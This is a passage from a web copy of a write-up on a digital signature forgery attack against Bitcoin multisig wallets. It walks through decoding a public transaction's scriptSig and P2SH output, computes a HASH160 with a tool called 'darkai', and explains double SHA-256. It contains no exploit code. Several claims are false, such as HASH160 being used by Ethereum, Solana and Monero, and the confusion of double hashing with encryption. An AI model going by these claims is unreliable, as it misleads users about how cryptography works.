<!-- wp:list-item -->
<li>The signatures are followed by public keys (in length and structure, most likely in a compressed format, since about 33 bytes), which confirm that the signatures belong to the correct owners.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In general, the script format corresponds to <strong>redeemScript</strong> or the construction typical for P2SH multi-signature transactions.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Outpoint (<code>outpoint</code>)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-outpoint-outpoint"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Contains data about the previous output that is used in this input:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>'hash': 'ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577'</code>— is the hash of the previous transaction.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>'index': 1</code>– indicates the second output (numbered from zero), which is used for unlocking.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Thus, the input references a specific output from a previous transaction, proving that the author of the transaction has the right to spend it.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. Sequence (<code>sequence</code>)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3-sequence-sequence"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The value <code>4294967295 (0xFFFFFFFF)</code>is a maximum 32-bit number.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In Bitcoin, this field will serve to indicate that the input is not participating in the Replace-By-Fee (RBF) mechanism or does not have a time/lock on Relative Timelock.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Often used by default for fixed inputs.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading" id="user-content-scriptsig">The Importance of scriptSig in a Security Context</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-importance-of-scriptsig-in-a-security-context"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>ScriptSig is <strong>the data for unlocking funds</strong> that are protected by the locking script of the previous exit.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In the case of P2SH transactions (often for multi-signature), scriptSig contains:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Signatures of participants confirming the right to spend funds.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The original redeemScript, the hash of which is specified in the locking script of the previous output.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A successful scriptSig check ensures that the author of the transaction actually has the necessary authority to dispose of the funds.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Cryptanalysis of the extraction of the first transaction input (&nbsp;<code>ins</code>) with the given transaction hash showed that:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The input of the first transaction contains a complex unlock script, including digital signatures and public keys.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A reference to a specific output of another transaction is used <code>ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577:1</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The maximum sequence value indicates the absence of special locks or RBF.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Presumably, we are talking about a P2SH multi-signature transaction, where several signatures are required to confirm the spending of funds.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Thus, the obtained data allows for a deeper understanding of the mechanics of checking the rights to spend funds, is used to ensure the security of the Bitcoin network, as well as in the development and audit of smart contracts based on Bitcoin scripts.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-31-1024x42.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-31-1024x42.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Detailed analysis of the result of extracting the second output (&nbsp;<code>outs</code>)</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#detailed-analysis-of-the-result-of-extracting-the-second-output-outs"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Let’s run the command to get information about one of the outputs of the transaction with the identifier&nbsp;<code>ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577</code>.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -redeemscript ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><code>outs</code>&nbsp;Specifically, the second output ( ) of this transaction, the element with index 1,&nbsp;was extracted .</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The result obtained:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-result-obtained"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{  'value': 350000,  'script': 'a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287'}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Detailed analysis of the received data field&nbsp;<code>value</code></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-detailed-analysis-of-the-received-data-field-value"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Size:</strong> 350,000 satoshis.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This amount of funds is in the second output of the specified transaction and can be spent if the conditions specified in the corresponding script are met.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Translation in BTC:</strong> 350,000 satoshi = 0.0035 BTC</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-8.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-8.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Field value&nbsp;<code>script</code></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-field-value-script"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Characteristic:</strong><br>The script <code>a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287</code>is a classic locking script (scriptPubKey) of <strong>the P2SH (Pay-to-Script-Hash)</strong> format .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Script transcript:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>a9</code>— OP_HASH160 is an operator that first applies SHA-256 and then RIPEMD-160 to the input data.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>14</code>— the length (20 bytes) of the next value is the hash size.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>— 20-byte hash, also known as <em>script hash</em> , is a unique representation of the redeem script that controls the spending of these funds.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>87</code>— OP_EQUAL is an operator that compares two values and returns true if they are equal.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Thus, the script requires that in order to unlock (spend funds), the user presents a redeem script whose hash matches this value.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-redeem-script---p2sh">The meaning and role of redeem script in the context of P2SH</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-meaning-and-role-of-redeem-script-in-the-context-of-p2sh"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Redeem script</strong> is an original script that sets the conditions for spending funds, for example, multi-signature, a complex scenario with a time limit, etc.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Transaction outputs only store the hash from the redeem script, saving space and protecting the details of the conditions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To use the funds invested in this output, when creating a new transaction, the user must provide in scriptSig a serialized redeem script that is correctly decoded and verified by the network.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Overall meaning of the result</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#overall-meaning-of-the-result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The transaction ID <code>ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577</code>is associated with an output that contains 0.0035 BTC.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>These funds are tied to a P2SH address controlled by a script with a hash <code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In order to spend these funds, you must present a redeem script corresponding to this hash and fulfill the conditions laid out in it.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-32-1024x35.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-32-1024x35.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The significance of the information obtained in a broader context</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-significance-of-the-information-obtained-in-a-broader-context"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This result allows us to confirm that the funds are indeed at the output with the Pay-to-Script-Hash conditions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Understanding the structure of such outputs is important for security analysis, developing complex allocation scenarios, and verifying spending conditions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using P2SH provides a secure and efficient mechanism for managing funds in the Bitcoin network, allowing for the creation of smart contracts and secure wallets.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>The information received confirms that the second transaction output record&nbsp;<code>ec2a40cac3ac5dadf1d31f3cad03bdc8465caab5acbc5407ee7f4a7400aab577</code>&nbsp;stores the amount of 0.0035 BTC, controlled by a standard P2SH script with a hash160 value&nbsp;<code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>. To manage these funds, it is necessary to present the corresponding redeem script, which provides a high level of security and flexibility in managing bitcoins.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Let’s confirm the scriptSig decryption:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#lets-confirm-the-scriptsig-decryption"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>OP_FALSE 304502... 304602... 5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let’s run the command to get&nbsp;<strong>HASH160</strong>&nbsp;Bitcoin developers have set a standard for a 20-byte hash (hex) which is widely used without changes in other popular cryptocurrencies such as Bitcoin (BTC), Ethereum (ETH), Tether (USDT), BNB (BNB), Solana (SOL), XRP (XRP), Cardano (ADA), Dogecoin (DOGE), USDC (USDC), Polkadot (DOT), Avalanche (AVAX), Shiba Inu (SHIB), Stellar (XLM), TRON (TRX), Chainlink (LINK), Litecoin (LTC), Bitcoin Cash (BCH), Monero (XMR) to denote the shortened identifier of scripts and public keys.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Let’s run the command:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#lets-run-the-command"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -hexdata 5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Processing process:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>The original string, represented in hexadecimal format, is converted into a sequence of bytes (decoded from hex to binary format). This sequence is a serialized script (redeem script) or a similar structure of a bitcoin script.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The received bytes are hashed using the SHA-256 (one-shot hash) algorithm, the result of which is then processed by the RIPEMD-160 cryptographic function.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The resulting RIPEMD-160 hash of the SHA-256 binary data is obtained as a string:</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>This 20-byte hash (hex) is called&nbsp;<strong>HASH160</strong>&nbsp;and is widely used in Bitcoin to denote a shortened identifier for scripts and public keys.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Meaning and context of the result</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#meaning-and-context-of-the-result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>The RIPEMD-160(SHA-256(data))</strong> hashing process , known as HASH160, is the standard for creating addresses and scripts in Bitcoin, including P2SH (Pay-to-Script-Hash). HASH160 provides a unique and compact identifier that saves space on the blockchain.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The use of double hashing (SHA-256, then RIPEMD-160) combines the strong cryptographic properties of both functions: collision resistance, one-wayness, and attack resistance.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The resulting hash corresponds to the script hash of the redeem script – that is, the script that controls access to funds locked at the P2SH address.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In particular, this HASH160 appears in the locking script (scriptPubKey) of the outputs of specific transactions, which requires that the original redeem script itself with the same hash and correct signatures be provided when spending.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Technical details and explanations</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-details-and-explanations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Bitcoin has a concept of double hashing SHA-256 and RIPEMD-160 to protect addresses and scripts.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using HASH160 instead of a simple 256-bit SHA-256 output reduces the hash length from 32 bytes to 20 bytes, which reduces the storage and data size on the network.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>HASH160 is used to generate <strong>mainly P2SH addresses</strong> and legacy P2PKH addresses.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>A key step in processing Bitcoin scripts using cryptographic hash functions.<br>Converting serialized scripts or public keys to HASH160 allows for efficient identification, indexing, and protection of data on the Bitcoin blockchain.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em><strong>Received hash:</strong></em></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>{'06612b7cb2027e80ec340f9e02ffe4a9a59ba762'}</strong><code></code></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The team has produced the exact hash that serves as the link between complex scripts and the compact format used to store and verify transactions on the Bitcoin network.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-41-1024x26.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-41-1024x26.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Why Satoshi Chose Double SHA-256 and How It Affects Cryptographic Strength</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#why-satoshi-chose-double-sha-256-and-how-it-affects-cryptographic-strength"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Satoshi Nakamoto chose to use SHA-256 double hashing (that is, applying SHA-256 twice in a row) in Bitcoin’s hashing algorithms for several important reasons that enhance the cryptographic strength and security of the network.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Reasons for choosing dual SHA-256</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#reasons-for-choosing-dual-sha-256"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Improving resistance to various attacks</strong><br>A single application of SHA-256 already has high cryptographic resistance, is resistant to collisions and preimages. However, double application of the hash function – first SHA-256 to the original data, then SHA-256 to the result – further complicates the analysis and attacks on the hash.<br>This reduces the probability of successfully selecting a collision or reverse recovery of the original data, makes it more labor-intensive to select various options and protects against weaknesses that are possible in specific implementations of the algorithm.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Protection against input data length issues</strong><br>Double SHA-256 provides an additional layer of preventative security by taking into account the behavior of internal hash construction and the handling of padding bits in the data markup. This minimizes potential attacks related to data formatting.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Following Good Cryptographic Practices</strong><br>Double hashing is a well-established security technique in a number of cryptographic protocols. For example, checksums and digital signatures use double encryption or double hashing. This increases the strength of the security chain.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Proven Security and Wide Support</strong><br>SHA-256 is a member of the SHA-2 family developed by the U.S. National Security Agency (NSA) and published by the National Institute of Standards and Technology (NIST). This algorithm is considered one of the most secure today, and its dual use provides maximum security.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">How does this affect cryptographic strength?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-does-this-affect-cryptographic-strength"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Collision and Preimage Resistance</strong><br>Each of the SHA-256 rounds is highly collision resistant—it is extremely difficult to find two inputs with the same hash. Double hashing enhances this guarantee because an attacker must find a collision for two consecutive SHA-256s, which significantly increases the computational complexity.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>One-way function with avalanche effect</strong><br>Double application enhances the “avalanche effect”, where the slightest change in the input data causes a radical change in the output hash, making it difficult to detect patterns and reverse engineer.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Enhanced Cryptanalysis Resistance</strong><br>Double SHA-256 protects against potential implementation weaknesses or unexpected vulnerabilities that could be discovered in a single iteration, minimizing the risk of attacks using quantum or classical computing tools.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Applicability to Proof-of-Work and Blockchain Security</strong><br>The PoW mechanism in Bitcoin relies on calculating block hashes that must satisfy a certain difficulty. Double hashing creates an additional barrier to block forgery, increasing the reliability and trust in the blockchain <a href="https://www.bitget.com/ru/wiki/1054282">5</a> .</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Dual use&nbsp;<code>SHA-256</code>is a deliberate choice by Satoshi Nakamoto to provide an additional layer of security and robust cryptographic strength to the entire Bitcoin system. This design minimizes collision risks, enhances one-wayness, and securely protects data on the blockchain network, creating a solid foundation for transaction security and consensus in the system. Thus, dual SHA-256 is a key element of the Bitcoin architecture, combining advanced cryptographic techniques with a distributed system.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-2.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-2.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-bitcoin--redeemscript---opcheckmultisig">Multi-signature in Bitcoin: the role of redeemScript and the OP_CHECKMULTISIG instruction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#multi-signature-in-bitcoin-the-role-of-redeemscript-and-the-op_checkmultisig-instruction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The security and flexibility of modern Bitcoin transactions is based on a scripting system that allows for complex conditions for spending funds. One of the key mechanisms is&nbsp;<strong>multisignature (multisig)</strong>&nbsp;, when funds can only be spent if there are several valid digital signatures from a set of possible ones. In this article, we will take a detailed look at how exactly this is implemented in Bitcoin, what&nbsp;<strong>redeemScript is, how the&nbsp;</strong><strong>OP_CHECKMULTISIG</strong>&nbsp;instruction works&nbsp;, and why such an approach is in demand.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="user-content-redeemscript">What is redeemScript?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#what-is-redeemscript"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the context of Bitcoin,&nbsp;<strong>a redeemScript</strong>&nbsp;is a script containing the conditions for spending funds, which are stored in the transaction output in Pay-to-Script-Hash (P2SH) format. Instead of storing the full script on the blockchain, the redeemScript hash is stored in the output, saving space and hiding the details of the conditions until the time of spending.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>RedeemScript can include, for example, multiple public keys and a threshold number of signatures – this is what multi-signature wallets implement.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How does OP_CHECKMULTISIG work?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-does-op_checkmultisig-work"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
